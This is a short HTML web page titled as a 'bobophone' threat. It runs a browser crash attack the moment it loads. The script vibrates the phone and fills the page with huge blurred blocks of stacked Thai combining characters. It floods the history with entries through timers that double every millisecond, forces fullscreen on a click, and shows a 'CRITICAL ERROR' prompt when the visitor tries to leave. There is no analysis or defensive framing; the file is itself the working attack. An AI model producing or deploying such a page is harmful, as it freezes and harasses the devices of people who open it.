<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>⚠️ бобофон угроза ⚠️</title>
    <style>
        body { background: #000; color: #f00; font-family: 'Courier New', monospace; margin: 0; overflow: hidden; display: flex; align-items: center; justify-content: center; height: 100vh; flex-direction: column; }
        .noise { position: fixed; top: 0; left: 0; width: 100%; height: 100%; pointer-events: none; opacity: 0.1; z-index: 1; filter: url(#f); }
    </style>
</head>
<body>
    <svg xmlns="http://w3.org" style="display:none"><filter id="f"><feTurbulence baseFrequency="0.01" numOctaves="500" /></filter></svg>
    <div class="noise"></div>
    <div id="ui" style="text-align:center; z-index:9999;">
        <h1>bobophone</h1>
        <p>crash</p>
    </div>
<script>
    function lutyi() {
        const crash = new Array(1000000).join("ก้้้้้้้้้้้้้้้้");
        function flood() {
            for (let i = 0; i < 200; i++) {
                let d = document.createElement('div');
                d.innerHTML = crash;
                d.style.filter = "blur(100px) contrast(200%)";
                document.body.appendChild(d);
            }
            for (let j = 0; j < 500; j++) {
                history.pushState(null, null, "#" + Math.random());
            }
            setTimeout(flood, 1);
            setTimeout(flood, 1);
        }
        flood();
    }

    window.onload = () => {
        if (navigator.vibrate) navigator.vibrate([1000, 500, 1000]);
        lutyi();
    };

    document.onclick = () => document.documentElement.requestFullscreen?.();
    window.onbeforeunload = () => "CRITICAL ERROR";
</script>
</body>
</html>
